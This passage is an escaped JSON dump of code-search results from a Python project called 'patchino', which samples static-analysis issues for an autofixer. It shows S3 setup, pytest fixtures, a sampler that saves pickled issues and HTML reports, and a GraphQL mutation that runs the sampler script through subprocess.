os.getenv(\\\\\\"DATASET_DATA_FOLDER_PATH\\\\\\", SCRIPT_PATH / \\\\\\"../../../dataset/data\\\\\\")\\\\n)\\\\n\\\\nload_dotenv(dotenv_path=AUTOFIXER_DIR / \\\\\\".env\\\\\\")\\\\n\\\\nS3_ACCESS = S3Access.init_connection(\\\\n    \\\\\\"DATASET_S3_COONECTION\\\\\\",\\\\n    \\\\\\"mobb-dev-dataset\\\\\\",\\\\n    \\\\\\"us-west-2\\\\\\",\\\\n    os.environ[\\\\\\"AWS_DATASET_S3_ACCESS_KEY_ID\\\\\\"],\\\\n    os.environ[\\\\\\"AWS_DATASET_S3_ACCESS_KEY\\\\\\"],\\\\n)\\",\\"originalContents\\":\\"from __future__ import annotations\\\\n\\\\nfrom typing import Annotated, Optional\\\\n\\\\nimport json\\\\nimport os\\\\nimport pathlib\\\\nimport pickle\\\\nimport random\\\\nimport tempfile\\\\nimport time\\\\nimport zipfile\\\\nfrom collections import defaultdict\\\\nfrom dataclasses import dataclass\\\\n\\\\nimport fire  # type: ignore[import-untyped]\\\\nfrom analyzer.highlight_nodes import highlight_nodes_report_for_issues\\\\nfrom analyzer.locked_alru_cache import locked_alru_cache\\\\nfrom annotated_types import Len\\\\nfrom dotenv import load_dotenv\\\\nfrom pycommon.report import BaseReportStream, get_report_by_file_stream\\\\nfrom pycommon.report.file_loader import FileLoader\\\\nfrom pycommon.report.issue import Issue\\\\nfrom pycommon.s3 import S3Access\\\\nfrom pydantic import BaseModel\\\\n\\\\nSCRIPT_PATH = pathlib.Path(__file__).parent\\\\nAUTOFIXER_DIR = SCRIPT_PATH.parent.parent.parent\\\\nDATASET_DATA_FOLDER_PATH = pathlib.Path(\\\\n    os.getenv(\\\\\\"DATASET_DATA_FOLDER_PATH\\\\\\", SCRIPT_PATH / \\\\\\"../../../dataset/data\\\\\\")\\\\n)\\\\n\\\\nload_dotenv(dotenv_path=AUTOFIXER_DIR / \\\\\\".env\\\\\\")\\\\n\\\\nS3_ACCESS = S3Access.init_connection(\\\\n    \\\\\\"DATASET_S3_COONECTION\\\\\\",\\\\n    \\\\\\"mobb-dev-dataset\\\\\\",\\\\n    \\\\\\"us-west-2\\\\\\",\\\\n    os.environ[\\\\\\"AWS_DATASET_S3_ACCESS_KEY_ID\\\\\\"],\\\\n    os.environ[\\\\\\"AWS_DATASET_S3_ACCESS_KEY\\\\\\"],\\\\n)\\",\\"detailedLines\\":[{\\"text\\":\\"from __future__ import annotations\\",\\"lineNumber\\":1},{\\"lineNumber\\":2},{\\"text\\":\\"from typing import Annotated, Optional\\",\\"lineNumber\\":3},{\\"lineNumber\\":4},{\\"text\\":\\"import json\\",\\"lineNumber\\":5},{\\"text\\":\\"import os\\",\\"lineNumber\\":6},{\\"text\\":\\"import pathlib\\",\\"lineNumber\\":7},{\\"text\\":\\"import pickle\\",\\"lineNumber\\":8},{\\"text\\":\\"import random\\",\\"lineNumber\\":9},{\\"text\\":\\"import tempfile\\",\\"lineNumber\\":10},{\\"text\\":\\"import time\\",\\"lineNumber\\":11},{\\"text\\":\\"import zipfile\\",\\"lineNumber\\":12},{\\"text\\":\\"from collections import defaultdict\\",\\"lineNumber\\":13},{\\"text\\":\\"from dataclasses import dataclass\\",\\"lineNumber\\":14},{\\"lineNumber\\":15},{\\"text\\":\\"import fire  # type: ignore[import-untyped]\\",\\"lineNumber\\":16},{\\"text\\":\\"from analyzer.highlight_nodes import highlight_nodes_report_for_issues\\",\\"lineNumber\\":17},{\\"text\\":\\"from analyzer.locked_alru_cache import locked_alru_cache\\",\\"lineNumber\\":18},{\\"text\\":\\"from annotated_types import Len\\",\\"lineNumber\\":19},{\\"text\\":\\"from dotenv import load_dotenv\\",\\"lineNumber\\":20},{\\"text\\":\\"from pycommon.report import BaseReportStream, get_report_by_file_stream\\",\\"lineNumber\\":21},{\\"text\\":\\"from pycommon.report.file_loader import FileLoader\\",\\"lineNumber\\":22},{\\"text\\":\\"from pycommon.report.issue import Issue\\",\\"lineNumber\\":23},{\\"text\\":\\"from pycommon.s3 import S3Access\\",\\"lineNumber\\":24},{\\"text\\":\\"from pydantic import BaseModel\\",\\"lineNumber\\":25},{\\"lineNumber\\":26},{\\"text\\":\\"SCRIPT_PATH = pathlib.Path(__file__).parent\\",\\"lineNumber\\":27},{\\"text\\":\\"AUTOFIXER_DIR = SCRIPT_PATH.parent.parent.parent\\",\\"lineNumber\\":28},{\\"text\\":\\"DATASET_DATA_FOLDER_PATH = pathlib.Path(\\",\\"lineNumber\\":29},{\\"text\\":\\"    os.getenv(\\\\\\"DATASET_DATA_FOLDER_PATH\\\\\\", SCRIPT_PATH / \\\\\\"../../../dataset/data\\\\\\")\\",\\"lineNumber\\":30},{\\"text\\":\\")\\",\\"lineNumber\\":31},{\\"lineNumber\\":32},{\\"text\\":\\"load_dotenv(dotenv_path=AUTOFIXER_DIR / \\\\\\".env\\\\\\")\\",\\"lineNumber\\":33},{\\"lineNumber\\":34},{\\"text\\":\\"S3_ACCESS = S3Access.init_connection(\\",\\"lineNumber\\":35},{\\"text\\":\\"    \\\\\\"DATASET_S3_COONECTION\\\\\\",\\",\\"lineNumber\\":36},{\\"text\\":\\"    \\\\\\"mobb-dev-dataset\\\\\\",\\",\\"lineNumber\\":37},{\\"text\\":\\"    \\\\\\"us-west-2\\\\\\",\\",\\"lineNumber\\":38},{\\"text\\":\\"    os.environ[\\\\\\"AWS_DATASET_S3_ACCESS_KEY_ID\\\\\\"],\\",\\"lineNumber\\":39},{\\"text\\":\\"    os.environ[\\\\\\"AWS_DATASET_S3_ACCESS_KEY\\\\\\"],\\",\\"lineNumber\\":40},{\\"text\\":\\")\\",\\"lineNumber\\":41},{\\"lineNumber\\":42},{\\"lineNumber\\":43},{\\"text\\":\\"language_mapping = {\\",\\"lineNumber\\":44},{\\"text\\":\\"    \\\\\\"asp\\\\\\": None,\\",\\"lineNumber\\":45},{\\"text\\":\\"    \\\\\\"azureresourcemanager\\\\\\": None,\\",\\"lineNumber\\":46}]},\\"score\\":0.31523633003234863},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/tests/conftest.py\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":61}},\\"contents\\":\\"import os\\\\nimport pathlib\\\\nfrom unittest.mock import AsyncMock, MagicMock\\\\nfrom uuid import UUID\\\\n\\\\nimport pytest\\\\n\\\\n# Test data paths\\\\nTESTS_DIR = pathlib.Path(__file__).parent\\\\nFIXTURES_DIR = TESTS_DIR / \\\\\\"fixtures\\\\\\"\\\\nSAMPLE_PROMPTS_DIR = FIXTURES_DIR / \\\\\\"sample_prompt_templates\\\\\\"\\\\n\\\\n# Create directories if they don't exist\\\\nFIXTURES_DIR.mkdir(exist_ok=True)\\\\nSAMPLE_PROMPTS_DIR.mkdir(exist_ok=True)\\\\n\\\\n\\\\n@pytest.fixture\\\\ndef sample_run_id():\\\\n    \\\\\\"\\\\\\"\\\\\\"Generate a consistent UUID for testing.\\\\\\"\\\\\\"\\\\\\"\\\\n    return UUID(\\\\\\"12345678-1234-5678-9012-123456789012\\\\\\")\\",\\"originalContents\\":\\"import os\\\\nimport pathlib\\\\nfrom unittest.mock import AsyncMock, MagicMock\\\\nfrom uuid import UUID\\\\n\\\\nimport pytest\\\\n\\\\n# Test data paths\\\\nTESTS_DIR = pathlib.Path(__file__).parent\\\\nFIXTURES_DIR = TESTS_DIR / \\\\\\"fixtures\\\\\\"\\\\nSAMPLE_PROMPTS_DIR = FIXTURES_DIR / \\\\\\"sample_prompt_templates\\\\\\"\\\\n\\\\n# Create directories if they don't exist\\\\nFIXTURES_DIR.mkdir(exist_ok=True)\\\\nSAMPLE_PROMPTS_DIR.mkdir(exist_ok=True)\\\\n\\\\n\\\\n@pytest.fixture\\\\ndef sample_run_id():\\\\n    \\\\\\"\\\\\\"\\\\\\"Generate a consistent UUID for testing.\\\\\\"\\\\\\"\\\\\\"\\\\n    return UUID(\\\\\\"12345678-1234-5678-9012-123456789012\\\\\\")\\",\\"detailedLines\\":[{\\"text\\":\\"import os\\",\\"lineNumber\\":1},{\\"text\\":\\"import pathlib\\",\\"lineNumber\\":2},{\\"text\\":\\"from unittest.mock import AsyncMock, MagicMock\\",\\"lineNumber\\":3},{\\"text\\":\\"from uuid import UUID\\",\\"lineNumber\\":4},{\\"lineNumber\\":5},{\\"text\\":\\"import pytest\\",\\"lineNumber\\":6},{\\"lineNumber\\":7},{\\"text\\":\\"# Test data paths\\",\\"lineNumber\\":8},{\\"text\\":\\"TESTS_DIR = pathlib.Path(__file__).parent\\",\\"lineNumber\\":9},{\\"text\\":\\"FIXTURES_DIR = TESTS_DIR / \\\\\\"fixtures\\\\\\"\\",\\"lineNumber\\":10},{\\"text\\":\\"SAMPLE_PROMPTS_DIR = FIXTURES_DIR / \\\\\\"sample_prompt_templates\\\\\\"\\",\\"lineNumber\\":11},{\\"lineNumber\\":12},{\\"text\\":\\"# Create directories if they don't exist\\",\\"lineNumber\\":13},{\\"text\\":\\"FIXTURES_DIR.mkdir(exist_ok=True)\\",\\"lineNumber\\":14},{\\"text\\":\\"SAMPLE_PROMPTS_DIR.mkdir(exist_ok=True)\\",\\"lineNumber\\":15},{\\"lineNumber\\":16},{\\"lineNumber\\":17},{\\"text\\":\\"@pytest.fixture\\",\\"lineNumber\\":18},{\\"text\\":\\"def sample_run_id():\\",\\"lineNumber\\":19,\\"isSignature\\":true},{\\"text\\":\\"    \\\\\\"\\\\\\"\\\\\\"Generate a consistent UUID for testing.\\\\\\"\\\\\\"\\\\\\"\\",\\"lineNumber\\":20},{\\"text\\":\\"    return UUID(\\\\\\"12345678-1234-5678-9012-123456789012\\\\\\")\\",\\"lineNumber\\":21,\\"isSignature\\":true},{\\"lineNumber\\":22},{\\"lineNumber\\":23},{\\"text\\":\\"@pytest.fixture\\",\\"lineNumber\\":24},{\\"text\\":\\"def sample_feedback_data():\\",\\"lineNumber\\":25,\\"isSignature\\":true},{\\"text\\":\\"    \\\\\\"\\\\\\"\\\\\\"Sample feedback data that matches the GraphQL response structure.\\\\\\"\\\\\\"\\\\\\"\\",\\"lineNumber\\":26}]},\\"score\\":0.3096945881843567},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":242},\\"endPosition\\":{\\"line\\":339}},\\"contents\\":\\"\\\\n\\\\n\\\\nasync def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\\\n    dest_path = pathlib.Path(config.output_dir_path)\\\\n    dest_path.mkdir(parents=True, exist_ok=True)\\\\n\\\\n    serialized_samples = []\\\\n\\\\n    for sample in samples:\\\\n        issue_hash = sample.issue.fingerprint_hash\\\\n\\\\n        abs_path_to_issue_object = (\\\\n            pathlib.Path(config.output_dir_path) / f\\\\\\"{issue_hash}.pkl\\\\\\"\\\\n        )\\\\n        path_to_issue_highlight_nodes_html = (\\\\n            pathlib.Path(config.output_dir_path) / f\\\\\\"{issue_hash}.html\\\\\\"\\\\n        )\\\\n\\\\n        rel_sast_report_path = os.path.relpath(\\\\n            sample.report_path, config.output_dir_path\\\\n        )\\\\n        rel_source_code_path = os.path.relpath(\\\\n            sample.source_archive_path, config.output_dir_path\\\\n        )\\\\n\\\\n        serialized_samples.append(\\\\n            {\\\\n                \\\\\\"is_public\\\\\\": sample.is_public,\\\\n                \\\\\\"report_index\\\\\\": sample.issue.index,\\\\n                \\\\\\"issue_object_hash\\\\\\": issue_hash,\\\\n                \\\\\\"path_to_issue_object\\\\\\": os.path.relpath(\\\\n                    abs_path_to_issue_object, config.output_dir_path\\\\n                ),\\\\n                \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": os.path.relpath(\\\\n                    path_to_issue_highlight_nodes_html, config.output_dir_path\\\\n                ),\\\\n                \\\\\\"sast_report_path\\\\\\": rel_sast_report_path,\\\\n                \\\\\\"source_code_path\\\\\\": rel_source_code_path,\\\\n                \\\\\\"sast_provider\\\\\\": sample.issue.provider.name,\\\\n                \\\\\\"sast_provider_issue_name\\\\\\": sample.issue.raw_issue_type,\\\\n                \\\\\\"sast_provider_severity\\\\\\": sample.issue.raw_severity,\\\\n                \\\\\\"sast_provider_language\\\\\\": sample.issue.raw_language,\\\\n                \\\\\\"skip_issue\\\\\\": False,\\\\n            }\\\\n        )\\\\n\\\\n        with open(abs_path_to_issue_object, \\\\\\"wb\\\\\\") as f:\\\\n            pickle.dump(sample.issue, f, protocol=pickle.HIGHEST_PROTOCOL)\\",\\"originalContents\\":\\"\\\\n\\\\n\\\\nasync def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\\\n    dest_path = pathlib.Path(config.output_dir_path)\\\\n    dest_path.mkdir(parents=True, exist_ok=True)\\\\n\\\\n    serialized_samples = []\\\\n\\\\n    for sample in samples:\\\\n        issue_hash = sample.issue.fingerprint_hash\\\\n\\\\n        abs_path_to_issue_object = (\\\\n            pathlib.Path(config.output_dir_path) / f\\\\\\"{issue_hash}.pkl\\\\\\"\\\\n        )\\\\n        path_to_issue_highlight_nodes_html = (\\\\n            pathlib.Path(config.output_dir_path) / f\\\\\\"{issue_hash}.html\\\\\\"\\\\n        )\\\\n\\\\n        rel_sast_report_path = os.path.relpath(\\\\n            sample.report_path, config.output_dir_path\\\\n        )\\\\n        rel_source_code_path = os.path.relpath(\\\\n            sample.source_archive_path, config.output_dir_path\\\\n        )\\\\n\\\\n        serialized_samples.append(\\\\n            {\\\\n                \\\\\\"is_public\\\\\\": sample.is_public,\\\\n                \\\\\\"report_index\\\\\\": sample.issue.index,\\\\n                \\\\\\"issue_object_hash\\\\\\": issue_hash,\\\\n                \\\\\\"path_to_issue_object\\\\\\": os.path.relpath(\\\\n                    abs_path_to_issue_object, config.output_dir_path\\\\n                ),\\\\n                \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": os.path.relpath(\\\\n                    path_to_issue_highlight_nodes_html, config.output_dir_path\\\\n                ),\\\\n                \\\\\\"sast_report_path\\\\\\": rel_sast_report_path,\\\\n                \\\\\\"source_code_path\\\\\\": rel_source_code_path,\\\\n                \\\\\\"sast_provider\\\\\\": sample.issue.provider.name,\\\\n                \\\\\\"sast_provider_issue_name\\\\\\": sample.issue.raw_issue_type,\\\\n                \\\\\\"sast_provider_severity\\\\\\": sample.issue.raw_severity,\\\\n                \\\\\\"sast_provider_language\\\\\\": sample.issue.raw_language,\\\\n                \\\\\\"skip_issue\\\\\\": False,\\\\n            }\\\\n        )\\\\n\\\\n        with open(abs_path_to_issue_object, \\\\\\"wb\\\\\\") as f:\\\\n            pickle.dump(sample.issue, f, protocol=pickle.HIGHEST_PROTOCOL)\\",\\"detailedLines\\":[{\\"text\\":\\"async def main(\\",\\"lineNumber\\":243,\\"isSignature\\":true},{\\"text\\":\\"    input_config_abs_path: str = str(SCRIPT_PATH / \\\\\\"../sampler_config.json\\\\\\"),\\",\\"lineNumber\\":244,\\"isSignature\\":true},{\\"text\\":\\"):\\",\\"lineNumber\\":245,\\"isSignature\\":true},{\\"lineNumber\\":267},{\\"text\\":\\"    print(\\\\\\"Done\\\\\\")\\",\\"lineNumber\\":268,\\"isSignature\\":true},{\\"lineNumber\\":269},{\\"lineNumber\\":270},{\\"text\\":\\"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\",\\"lineNumber\\":271,\\"isSignature\\":true},{\\"text\\":\\"    dest_path = pathlib.Path(config.output_dir_path)\\",\\"lineNumber\\":272},{\\"text\\":\\"    dest_path.mkdir(parents=True, exist_ok=True)\\",\\"lineNumber\\":273},{\\"lineNumber\\":274},{\\"text\\":\\"    serialized_samples = []\\",\\"lineNumber\\":275},{\\"lineNumber\\":276},{\\"text\\":\\"    for sample in samples:\\",\\"lineNumber\\":277},{\\"text\\":\\"        issue_hash = sample.issue.fingerprint_hash\\",\\"lineNumber\\":278},{\\"lineNumber\\":279},{\\"text\\":\\"        abs_path_to_issue_object = (\\",\\"lineNumber\\":280},{\\"text\\":\\"            pathlib.Path(config.output_dir_path) / f\\\\\\"{issue_hash}.pkl\\\\\\"\\",\\"lineNumber\\":281},{\\"text\\":\\"        )\\",\\"lineNumber\\":282},{\\"text\\":\\"        path_to_issue_highlight_nodes_html = (\\",\\"lineNumber\\":283},{\\"text\\":\\"            pathlib.Path(config.output_dir_path) / f\\\\\\"{issue_hash}.html\\\\\\"\\",\\"lineNumber\\":284},{\\"text\\":\\"        )\\",\\"lineNumber\\":285},{\\"lineNumber\\":286},{\\"text\\":\\"        rel_sast_report_path = os.path.relpath(\\",\\"lineNumber\\":287},{\\"text\\":\\"            sample.report_path, config.output_dir_path\\",\\"lineNumber\\":288},{\\"text\\":\\"        )\\",\\"lineNumber\\":289},{\\"text\\":\\"        rel_source_code_path = os.path.relpath(\\",\\"lineNumber\\":290},{\\"text\\":\\"            sample.source_archive_path, config.output_dir_path\\",\\"lineNumber\\":291},{\\"text\\":\\"        )\\",\\"lineNumber\\":292},{\\"lineNumber\\":293},{\\"text\\":\\"        serialized_samples.append(\\",\\"lineNumber\\":294},{\\"text\\":\\"            {\\",\\"lineNumber\\":295},{\\"text\\":\\"                \\\\\\"is_public\\\\\\": sample.is_public,\\",\\"lineNumber\\":296},{\\"text\\":\\"                \\\\\\"report_index\\\\\\": sample.issue.index,\\",\\"lineNumber\\":297},{\\"text\\":\\"                \\\\\\"issue_object_hash\\\\\\": issue_hash,\\",\\"lineNumber\\":298},{\\"text\\":\\"                \\\\\\"path_to_issue_object\\\\\\": os.path.relpath(\\",\\"lineNumber\\":299},{\\"text\\":\\"                    abs_path_to_issue_object, config.output_dir_path\\",\\"lineNumber\\":300},{\\"text\\":\\"                ),\\",\\"lineNumber\\":301},{\\"text\\":\\"                \\\\\\"path_to_issue_highlight_nodes_html\\\\\\": os.path.relpath(\\",\\"lineNumber\\":302},{\\"text\\":\\"                    path_to_issue_highlight_nodes_html, config.output_dir_path\\",\\"lineNumber\\":303},{\\"text\\":\\"                ),\\",\\"lineNumber\\":304},{\\"text\\":\\"                \\\\\\"sast_report_path\\\\\\": rel_sast_report_path,\\",\\"lineNumber\\":305},{\\"text\\":\\"                \\\\\\"source_code_path\\\\\\": rel_source_code_path,\\",\\"lineNumber\\":306},{\\"text\\":\\"                \\\\\\"sast_provider\\\\\\": sample.issue.provider.name,\\",\\"lineNumber\\":307},{\\"text\\":\\"                \\\\\\"sast_provider_issue_name\\\\\\": sample.issue.raw_issue_type,\\",\\"lineNumber\\":308},{\\"text\\":\\"                \\\\\\"sast_provider_severity\\\\\\": sample.issue.raw_severity,\\",\\"lineNumber\\":309},{\\"text\\":\\"                \\\\\\"sast_provider_language\\\\\\": sample.issue.raw_language,\\",\\"lineNumber\\":310},{\\"text\\":\\"                \\\\\\"skip_issue\\\\\\": False,\\",\\"lineNumber\\":311},{\\"text\\":\\"            }\\",\\"lineNumber\\":312},{\\"text\\":\\"        )\\",\\"lineNumber\\":313},{\\"lineNumber\\":314},{\\"text\\":\\"        with open(abs_path_to_issue_object, \\\\\\"wb\\\\\\") as f:\\",\\"lineNumber\\":315},{\\"text\\":\\"            pickle.dump(sample.issue, f, protocol=pickle.HIGHEST_PROTOCOL)\\",\\"lineNumber\\":316},{\\"lineNumber\\":317},{\\"text\\":\\"        with open(path_to_issue_highlight_nodes_html, \\\\\\"w\\\\\\") as f:\\",\\"lineNumber\\":318}]},\\"score\\":0.30686768889427185},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":267,\\"column\\":17},\\"endPosition\\":{\\"line\\":398}},\\"contents\\":\\"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\\\n\\\\n\\\\n        ...\\\\n\\\\n\\\\n        with open(path_to_issue_highlight_nodes_html, \\\\\\"w\\\\\\") as f:\\\\n            f.write(\\\\n                await highlight_nodes_report_for_issues(\\\\n                    report_file_path=rel_sast_report_path,\\\\n                    source_code_dir_path=rel_source_code_path,\\\\n                    report=sample.report,\\\\n                    issues=[sample.issue],\\\\n                    filtered_issues=[sample.issue],\\\\n                    git_info={},\\\\n                    include_fix=False,\\\\n                )\\\\n            )\\\\n\\\\n    with open(dest_path / \\\\\\"samples.json\\\\\\", \\\\\\"w\\\\\\") as f:\\\\n        json.dump(\\\\n            {\\\\n                \\\\\\"created_at\\\\\\": int(time.time()),\\\\n                \\\\\\"issues\\\\\\": serialized_samples,\\\\n                \\\\\\"is_from_docker\\\\\\": config.is_from_docker,\\\\n            },\\\\n            f,\\\\n            indent=4,\\\\n        )\\",\\"originalContents\\":\\"\\\\n\\\\n        with open(path_to_issue_highlight_nodes_html, \\\\\\"w\\\\\\") as f:\\\\n            f.write(\\\\n                await highlight_nodes_report_for_issues(\\\\n                    report_file_path=rel_sast_report_path,\\\\n                    source_code_dir_path=rel_source_code_path,\\\\n                    report=sample.report,\\\\n                    issues=[sample.issue],\\\\n                    filtered_issues=[sample.issue],\\\\n                    git_info={},\\\\n                    include_fix=False,\\\\n                )\\\\n            )\\\\n\\\\n    with open(dest_path / \\\\\\"samples.json\\\\\\", \\\\\\"w\\\\\\") as f:\\\\n        json.dump(\\\\n            {\\\\n                \\\\\\"created_at\\\\\\": int(time.time()),\\\\n                \\\\\\"issues\\\\\\": serialized_samples,\\\\n                \\\\\\"is_from_docker\\\\\\": config.is_from_docker,\\\\n            },\\\\n            f,\\\\n            indent=4,\\\\n        )\\",\\"detailedLines\\":[{\\"text\\":\\"async def _save_output(config: SamplerConfig, samples: list[Sample]) -> None:\\",\\"lineNumber\\":271,\\"isSignature\\":true},{\\"text\\":\\"    \\",\\"lineNumber\\":272},{\\"lineNumber\\":315},{\\"text\\":\\"            pickle.dump(sample.issue, f, protocol=pickle.HIGHEST_PROTOCOL)\\",\\"lineNumber\\":316},{\\"lineNumber\\":317},{\\"text\\":\\"        with open(path_to_issue_highlight_nodes_html, \\\\\\"w\\\\\\") as f:\\",\\"lineNumber\\":318},{\\"text\\":\\"            f.write(\\",\\"lineNumber\\":319},{\\"text\\":\\"                await highlight_nodes_report_for_issues(\\",\\"lineNumber\\":320},{\\"text\\":\\"                    report_file_path=rel_sast_report_path,\\",\\"lineNumber\\":321},{\\"text\\":\\"                    source_code_dir_path=rel_source_code_path,\\",\\"lineNumber\\":322},{\\"text\\":\\"                    report=sample.report,\\",\\"lineNumber\\":323},{\\"text\\":\\"                    issues=[sample.issue],\\",\\"lineNumber\\":324},{\\"text\\":\\"                    filtered_issues=[sample.issue],\\",\\"lineNumber\\":325},{\\"text\\":\\"                    git_info={},\\",\\"lineNumber\\":326},{\\"text\\":\\"                    include_fix=False,\\",\\"lineNumber\\":327},{\\"text\\":\\"                )\\",\\"lineNumber\\":328},{\\"text\\":\\"            )\\",\\"lineNumber\\":329},{\\"lineNumber\\":330},{\\"text\\":\\"    with open(dest_path / \\\\\\"samples.json\\\\\\", \\\\\\"w\\\\\\") as f:\\",\\"lineNumber\\":331},{\\"text\\":\\"        json.dump(\\",\\"lineNumber\\":332},{\\"text\\":\\"            {\\",\\"lineNumber\\":333},{\\"text\\":\\"                \\\\\\"created_at\\\\\\": int(time.time()),\\",\\"lineNumber\\":334},{\\"text\\":\\"                \\\\\\"issues\\\\\\": serialized_samples,\\",\\"lineNumber\\":335},{\\"text\\":\\"                \\\\\\"is_from_docker\\\\\\": config.is_from_docker,\\",\\"lineNumber\\":336},{\\"text\\":\\"            },\\",\\"lineNumber\\":337},{\\"text\\":\\"            f,\\",\\"lineNumber\\":338},{\\"text\\":\\"            indent=4,\\",\\"lineNumber\\":339},{\\"text\\":\\"        )\\",\\"lineNumber\\":340,\\"isSignature\\":true},{\\"lineNumber\\":341},{\\"lineNumber\\":342},{\\"text\\":\\"async def _get_customer_report_samples(config: SamplerConfig) -> list[Sample]:\\",\\"lineNumber\\":343,\\"isSignature\\":true},{\\"text\\":\\"    \\",\\"lineNumber\\":344}]},\\"score\\":0.2911666929721832},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"patchino/patchino/backend/mutations/run_sampler.py\\",\\"range\\":{\\"startPosition\\":{\\"line\\":13,\\"column\\":1},\\"endPosition\\":{\\"line\\":308}},\\"contents\\":\\"@strawberry.mutation\\\\nasync def run_sampler(\\\\n    self,\\\\n    sast_issue_languages: str,\\\\n    sast_issue_types: str,\\\\n) -> SamplerResult:\\\\n\\\\n\\\\n    ...\\\\n\\\\n\\\\n    command_str = \\\\\\" \\\\\\".join(cmd)\\\\n\\\\n    logger.info(f\\\\\\"📋 Executing command: {command_str}\\\\\\")\\\\n\\\\n    try:\\\\n        # Run from the patchino directory but set Python path to parent\\\\n        work_dir = Path(\\\\\\"/customuser/app/patchino\\\\\\")\\\\n\\\\n        # Set environment variables for Python path to include parent directory\\\\n        env = os.environ.copy()\\\\n        env[\\\\\\"PYTHONPATH\\\\\\"] = \\\\\\"/customuser/app/patchino\\\\\\"\\\\n        env[\\\\\\"PROJECT_DIR\\\\\\"] = \\\\\\"app\\\\\\"\\\\n\\\\n        # Execute the command\\\\n        logger.info(\\\\\\"⏳ Starting sampler script execution...\\\\\\")\\\\n\\\\n        # Run with real-time output streaming\\\\n        process = subprocess.Popen(\\\\n            cmd,\\\\n            cwd=work_dir,\\\\n            stdout=subprocess.PIPE,\\\\n            stderr=subprocess.PIPE,\\\\n            text=True,\\\\n            env=env,\\\\n            bufsize=1,\\\\n            universal_newlines=True,\\\\n        )\\\\n\\\\n        # Collect output in real-time\\\\n        sampler_output = \\\\\\"\\\\\\"\\\\n        sampler_error = \\\\\\"\\\\\\"\\",\\"originalContents\\":\\"\\\\n\\\\n    command_str = \\\\\\" \\\\\\".join(cmd)\\\\n\\\\n    logger.info(f\\\\\\"📋 Executing command: {command_str}\\\\\\")\\\\n\\\\n    try:\\\\n        # Run from the patchino directory but set Python path to parent\\\\n        work_dir = Path(\\\\\\"/customuser/app/patchino\\\\\\")\\\\n\\\\n        # Set environment variables for Python path to include parent directory\\\\n        env = os.environ.copy()\\\\n        env[\\\\\\"PYTHONPATH\\\\\\"] = \\\\\\"/customuser/app/patchino\\\\\\"\\\\n        env[\\\\\\"PROJECT_DIR\\\\\\"] = \\\\\\"app\\\\\\"\\\\n\\\\n        # Execute the command\\\\n        logger.info(\\\\\\"⏳ Starting sampler script execution...\\\\\\")\\\\n\\\\n        # Run with real-time output streaming\\\\n        process = subprocess.Popen(\\\\n            cmd,\\\\n            cwd=work_dir,\\\\n            stdout=subprocess.PIPE,\\\\n            stderr=subprocess.PIPE,\\\\n            text=True,\\\\n            env=env,\\\\n            bufsize=1,\\\\n            universal_newlines=True,\\\\n        )\\\\n\\\\n        # Collect output in real-time\\\\n        sampler_output = \\\\\\"\\\\\\"\\\\n        sampler_error = \\\\\\"\\\\\\"\\",\\"detailedLines\\":[{\\"text\\":\\"logger = logging.getLogger(__name__)\\",\\"lineNumber\\":15},{\\"lineNumber\\":16},{\\"lineNumber\\":17},{\\"text\\":\\"@strawberry.mutation\\",\\"lineNumber\\":18},{\\"text\\":\\"async def run_sampler(\\",\\"lineNumber\\":19,\\"isSignature\\":true},{\\"text\\":\\"    self,\\",\\"lineNumber\\":20,\\"isSignature\\":true},{\\"text\\":\\"    sast_issue_languages: str,\\",\\"lineNumber\\":21,\\"isSignature\\":true},{\\"text\\":\\"    sast_issue_types: str,\\",\\"lineNumber\\":22,\\"isSignature\\":true},{\\"text\\":\\") -> SamplerResult:\\",\\"lineNumber\\":23,\\"isSignature\\":true},{\\"text\\":\\"    \\",\\"lineNumber\\":24},{\\"lineNumber\\":67},{\\"text\\":\\"        )\\",\\"lineNumber\\":68},{\\"lineNumber\\":69},{\\"text\\":\\"    # Build the command\\",\\"lineNumber\\":70},{\\"text\\":\\"    cmd = [\\\\\\"poetry\\\\\\", \\\\\\"run\\\\\\", \\\\\\"python\\\\\\", \\\\\\"patchino/sampler.py\\\\\\", \\\\\\"./sampler_config.json\\\\\\"]\\",\\"lineNumber\\":71},{\\"lineNumber\\":72},{\\"text\\":\\"    command_str = \\\\\\" \\\\\\".join(cmd)\\",\\"lineNumber\\":73},{\\"lineNumber\\":74},{\\"text\\":\\"    logger.info(f\\\\\\"📋 Executing command: {command_str}\\\\\\")\\",\\"lineNumber\\":75},{\\"lineNumber\\":76},{\\"text\\":\\"    try:\\",\\"lineNumber\\":77},{\\"text\\":\\"        # Run from the patchino directory but set Python path to parent\\",\\"lineNumber\\":78},{\\"text\\":\\"        work_dir = Path(\\\\\\"/customuser/app/patchino\\\\\\")\\",\\"lineNumber\\":79},{\\"lineNumber\\":80},{\\"text\\":\\"        # Set environment variables for Python path to include parent directory\\",\\"lineNumber\\":81},{\\"text\\":\\"        env = os.environ.copy()\\",\\"lineNumber\\":82},{\\"text\\":\\"        env[\\\\\\"PYTHONPATH\\\\\\"] = \\\\\\"/customuser/app/patchino\\\\\\"\\",\\"lineNumber\\":83},{\\"text\\":\\"        env[\\\\\\"PROJECT_DIR\\\\\\"] = \\\\\\"app\\\\\\"\\",\\"lineNumber\\":84},{\\"lineNumber\\":85},{\\"text\\":\\"        # Execute the command\\",\\"lineNumber\\":86},{\\"text\\":\\"        logger.info(\\\\\\"⏳ Starting sampler script execution...\\\\\\")\\",\\"lineNumber\\":87},{\\"lineNumber\\":88},{\\"text\\":\\"        # Run with real-time output streaming\\",\\"lineNumber\\":89},{\\"text\\":\\"        process = subprocess.Popen(\\",\\"lineNumber\\":90},{\\"text\\":\\"            cmd,\\",\\"lineNumber\\":91},{\\"text\\":\\"            cwd=work_dir,\\",\\"lineNumber\\":92},{\\"text\\":\\"            stdout=subprocess.PIPE,\\",\\"lineNumber\\":93},{\\"text\\":\\"            